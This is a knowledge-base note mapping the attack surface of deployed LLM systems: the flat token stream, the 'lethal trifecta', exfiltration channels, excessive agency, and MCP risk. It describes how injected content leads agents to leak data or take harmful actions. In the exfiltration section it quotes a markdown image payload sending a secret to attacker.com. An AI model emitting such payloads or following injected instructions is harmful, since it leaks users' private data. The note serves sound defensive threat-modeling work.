---
tags: [concept, domain/safety-interp, level/surface]
aliases: [LLM attack surface, lethal trifecta]
summary: "Mapping the attack surface of a deployed LLM system: trust boundaries, exfiltration channels, and why agency multiplies risk."
---
> **One-paragraph hook:** Before you pick a specific defense, you need a map of what's actually attackable — and for LLM systems that map looks different from classical application security because the "parser" is a model that treats every token, trusted or not, the same way. This note orients the security wing of the domain: it enumerates the attack surface and the trust boundaries a real deployment has to reason about. The mechanism of each individual attack lives in its own note ([[Concept - Prompt Injection]], [[Concept - Data Poisoning and Backdoors]]); agent sandboxing practice is owned by domain 10 ([[Gotchas - Agents in Production]]).

## The mechanism

Start from the OWASP Top 10 for LLM Applications (2025 revision), which is the closest thing the field has to a standard threat checklist: LLM01 Prompt Injection, sensitive-information disclosure, supply-chain vulnerabilities, data/model poisoning, improper output handling, excessive agency, system-prompt leakage, vector/embedding weaknesses, misinformation, and unbounded resource consumption. That's a good enumeration, but the *reason* nearly every item on it exists traces back to one architectural fact:

**The model treats the system prompt, the user's turn, retrieved documents, and tool outputs as one flat token stream.** Nothing in the transformer's input marks which span is a trusted developer instruction and which is untrusted content encountered mid-task. This is the root cause underlying [[Concept - Prompt Injection]]: there is no instruction/data separation for an attacker to be blocked by, because the architecture was never given one to enforce. Classical application security has SQL parameters vs. SQL text, or code vs. data segments in memory — LLM applications, by default, have neither.

Simon Willison's **lethal trifecta** (2023) is the sharpest operational framing of when this architectural fact becomes exploitable: a system is exploitable by construction when it combines **(1)** access to private data, **(2)** exposure to untrusted content, and **(3)** a channel to exfiltrate data out. Remove any one leg and the same injected instruction becomes far less dangerous — no private data means nothing worth stealing; no untrusted content means no injection vector; no exfil channel means a successful injection can't get results out even if it fires. Threat modeling an LLM system reduces, in large part, to enumerating where all three legs are simultaneously present.

**Exfiltration channels** are the leg worth enumerating explicitly, because they're the one teams most often overlook: markdown image rendering (a model asked to render `![](https://attacker.com/log?data=SECRET)` causes the client to auto-fetch that URL, leaking `SECRET` in the query string, with no user click required), hyperlinks the user might click, unaudited tool calls that write somewhere attacker-visible, and DNS lookups triggered by rendered content. Each of these needs to be independently identified and blocked; blocking one does not block the others.

## In practice

**Agency multiplies the blast radius.** A pure chat interface with no tools has a narrow worst case: the model says something bad. Add [[Concept - Tool Use and Function Calling|tool use]], code execution, or [[Concept - Retrieval-Augmented Generation|RAG]] and the worst case becomes "the model does something bad" — sends an email, deletes a file, moves money. **Excessive agency** — broad tool scope combined with no human gate on side-effecting actions — is what turns a successful injection from an embarrassing output into a consequential action. This is why [[Deep Dive - The Agent Loop]] and agentic systems are treated as a materially higher-risk deployment class than single-turn chat, and why [[Gotchas - Agents in Production]] exists as its own subsystem-level catalog.

Two reference frames are worth keeping on hand when scoping a threat model: **MITRE ATLAS**, the adversarial-ML-specific analogue of the ATT&CK matrix, which catalogs adversary tactics/techniques against ML systems specifically (reconnaissance, ML supply chain compromise, model evasion, exfiltration); and a **CIA-triad adaptation** for LLMs — integrity maps to data/model poisoning, confidentiality maps to extraction and leakage (system-prompt leaks, training-data extraction), and availability maps to resource exhaustion (sponge prompts that deliberately maximize inference cost or latency).

A concrete example worth internalizing: [[Concept - Model Context Protocol (MCP)]] servers are a fast-growing instance of the lethal trifecta by default — an MCP tool that reads a user's inbox (private data), is exposed to arbitrary email content (untrusted content), and can also send email or hit arbitrary URLs (exfil channel) satisfies all three legs the moment it's wired up, with no additional attacker effort. Threat modeling an MCP integration means checking whether any single tool combination completes the trifecta, not whether any individual tool looks dangerous in isolation.

## Failure modes

- **Modeling outputs instead of actions.** Teams default to asking "can the model be made to say something bad?" and build a content filter for it. The actual boundary that matters is "can the model be made to *take a consequential action*?" — a content filter does nothing to stop an injected instruction from calling a tool. Detection: enumerate every side-effecting tool/API the model can reach and ask whether an untrusted-content path leads to it, independent of what the model's text output looks like.
- **Treating each exfiltration channel as covered by one control.** Blocking markdown image auto-render doesn't block a malicious hyperlink or a DNS-based leak. Detection: walk the exfil-channel list explicitly per deployment rather than relying on a single "output sanitizer."
- **Under-scoping the trust boundary at design time, then discovering it during an incident.** Retrieved documents and tool outputs are frequently treated as "part of the prompt" in code even when the threat model implicitly assumed they were trusted. Detection: audit where retrieved/tool content enters the context and confirm it's handled as untrusted at every downstream step, not just at ingestion.

## The non-obvious

Two features that are usually pitched as capability wins — bigger tool surfaces and richer retrieval — are, from a threat-modeling standpoint, the same lever as attack-surface expansion, and there is no way to get one without the other with current architectures. This means the threat model is not a one-time exercise at launch; it has to be re-run every time a new tool, a new data source, or broader retrieval scope is added, because each addition is a candidate new leg of the lethal trifecta, not an isolated feature.

## Connections
- [[Concept - Prompt Injection]] — the canonical attack that exploits the flat-token-stream root cause described here.
- [[Concept - Data Poisoning and Backdoors]] — the supply-chain / data-integrity leg of the OWASP taxonomy, attacking training rather than inference time.
- [[Gotchas - Agents in Production]] — the accumulated pitfalls of exactly the agency-multiplies-risk dynamic described above.
- [[Deep Dive - The Agent Loop]] — the architecture whose tool-calling step is where excessive agency becomes exploitable.
- [[Concept - Enterprise AI Security Exposure]] — the organizational/deployment-level view of this same risk surface, one level up from the technical mechanism.
- [[Concept - Model Context Protocol (MCP)]] — a concrete, fast-growing case where the lethal trifecta assembles itself by default.
- [[Decision - Defending Against Prompt Injection]] — where this threat model turns into an actual defense-selection decision.
- [[Reference - Jailbreak and Prompt Injection Attack Catalog]] — the enumerable, date-stamped catalog of specific attacks that instantiate this threat surface.
- [[Concept - Retrieval-Augmented Generation]] — a deliberate design that pulls untrusted content into the trusted context, widening exactly the attack surface this note maps.

## Sources
- OWASP (2025) — "OWASP Top 10 for LLM Applications." Standard enumeration of the LLM application attack surface referenced above.
- Willison, S. (2023) — the "lethal trifecta" framing (private data + untrusted content + exfiltration path).
- MITRE ATLAS — adversarial-ML tactics/techniques matrix, the ATT&CK analogue for ML systems.
